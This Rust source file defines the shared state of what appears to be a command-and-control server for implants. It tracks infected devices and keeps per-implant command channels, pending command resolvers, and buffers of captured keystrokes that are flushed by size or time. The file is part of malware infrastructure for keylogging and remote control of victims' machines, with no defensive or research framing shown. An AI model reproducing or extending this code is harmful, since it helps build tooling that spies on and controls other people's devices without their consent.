// src/state.rs

use crate::db::Db;
use sqlx::Pool;
use std::{collections::HashMap, sync::Arc};
use tokio::sync::{RwLock, mpsc, oneshot};

#[derive(Debug, Clone, PartialEq)]
pub enum Format {
    Json,
    Csv,
}

#[derive(Debug, Clone)]
pub struct Device {
    pub id: String,
    pub ip: String,
    pub active: bool,
    pub format: Format,
    pub program_id: i32,
    pub caps: Vec<String>,
    pub keylog_buf: String,
    pub keylog_last_flush: std::time::Instant,
}

impl Device {
    pub fn should_flush_keylog(&self) -> bool {
        self.keylog_buf.len() >= 100 || self.keylog_last_flush.elapsed().as_secs() >= 60
    }
}

#[derive(Clone)]
pub struct AppState {
    pub devices: Arc<RwLock<HashMap<String, Device>>>,
    pub db: Pool<Db>,

    /// device_id → sender into the implant's write loop.
    /// Inserted when an implant completes handshake; removed on disconnect.
    pub implant_senders: Arc<RwLock<HashMap<String, mpsc::Sender<String>>>>,

    /// device_id → one sender per open browser tab watching that device.
    /// The implant handler pushes events/status here; frontend handler reads them.
    pub frontend_senders: Arc<RwLock<HashMap<String, Vec<mpsc::Sender<String>>>>>,

    /// cmd_id → one-shot resolver.
    /// Frontend handler inserts before forwarding; implant handler resolves on CMD_OK/FAIL.
    pub pending_cmds: Arc<RwLock<HashMap<String, oneshot::Sender<String>>>>,
}

impl AppState {
    pub fn new(db: Pool<Db>) -> Self {
        Self {
            devices: Arc::new(RwLock::new(HashMap::new())),
            db,
            implant_senders: Arc::new(RwLock::new(HashMap::new())),
            frontend_senders: Arc::new(RwLock::new(HashMap::new())),
            pending_cmds: Arc::new(RwLock::new(HashMap::new())),
        }
    }
}
